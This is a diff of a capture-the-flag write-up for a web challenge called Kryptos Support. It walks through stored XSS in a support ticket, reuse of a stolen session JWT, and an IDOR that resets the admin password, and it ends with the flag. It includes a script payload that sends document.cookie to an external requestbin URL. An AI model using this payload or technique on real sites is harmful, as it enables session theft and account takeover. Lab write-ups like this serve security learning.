@@ -4,11 +4,14 @@ title: Kryptos Support
 ---
 
 # [Cyber Apocalypse](index.md) - Web - Kryptos Support
-*I did not have the foresight to save screenshots or the challenge description while the CTF was active*.
 
 This challenge is a support portal for some kind of vault. The landing page allows the user to enter text in a box and submit this as a ticket for an admin to review. There was no authentication on this page. 
 
+![Kryptos screenshot](web-kryptossupport/screenshot-00.png)
+
 There was a link to the **backend**, which led to a login page.
+
+![Kryptos screenshot](web-kryptossupport/screenshot-01.png)
 
 The login form was not susceptible to a simple SQL injection, so I looked elsewhere.
 
@@ -47,13 +50,17 @@ The URL of the request contained the cookie information, so I was able to simply
 Later, I discovered [Requestbin](https://requestbin.io) which would have made this a bit easier, and wouldn't as easily reveal my own IP address.
 
 ```javscript
-<script>var i=new Image;i.src="https://requestbin.io/10270d22/?"+document.cookie;</script>
+<script>var i=new Image;i.src="https://requestbin.io/1du9x2z1/?"+document.cookie;</script>
 ```
+
+![Kryptos screenshot](web-kryptossupport/screenshot-03.png)
+
 
 The cookie data was:
 ```
 session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MjgwNDR9.zewYLE5ZOkKHzHJlTA0eGrasx6-31UL5Jo9mhMH5RnE
 ```
+
 
 I noted that the session value was a JWT that can be decoded - each section, separated by periods, is just base64 encoded.
 ```json
@@ -72,7 +79,13 @@ In Firefox, I created a cookie named `session` with the value `eyJhbGciOiJIUzI1N
 
 In my exploration above, I had found `/tickets`, so with my new cookie I visited that page and was able to view the submitted tickets.
 
+
+![Kryptos screenshot](web-kryptossupport/screenshot-04.png)
+
 There were two tickets previously submitted which contained some numbers (`000083921` and `000076439`) which I noted for later (but never ended up using). The tickets did not contain names or usernames, so I was not able to get much info from them.
+
+
+![Kryptos screenshot](web-kryptossupport/screenshot-05.png)
 
 There was a **settings** link, which went to a page that allowed me to change the password of the currently logged in user. Trying this, I was able to reset the password of the **moderator** account. In a "real" engagement, this would make it pretty obvious that the system was compromised, considering the moderator user had just viewed my ticket and was presumably actively using the system, and would notice very quickly that their password had changed to something that they did not know. Luckily, the "moderator" user was just a script because this is just a challenge system, and wouldn't notice a thing.
 
@@ -93,8 +106,18 @@ Unlike the cookie, there is no cryptographic signature here, so I tried changing
 	"uid" : "1"
 }
 ```
+
+![Kryptos screenshot](web-kryptossupport/screenshot-06.png)
+
 The response from the API was "Password for admin changed successfully", which gave me the admin username.
 
 The "moderator" account clearly had permissions to reset passwords, but the system allowed it to reset *any* user's password, including the admin. Some security probably should have been in place to prevent a user with password reset privileges from resetting passwords of anyone else at the same or higher security levels, or something like that.
 
 Logging out of the moderator account, and into the admin account using `admin` and the password I set granted me access, and displayed the flag.
+
+
+![Kryptos screenshot](web-kryptossupport/screenshot-07.png)
+
+```
+HTB{x55_4nd_id0rs_ar3_fun!!}
+```
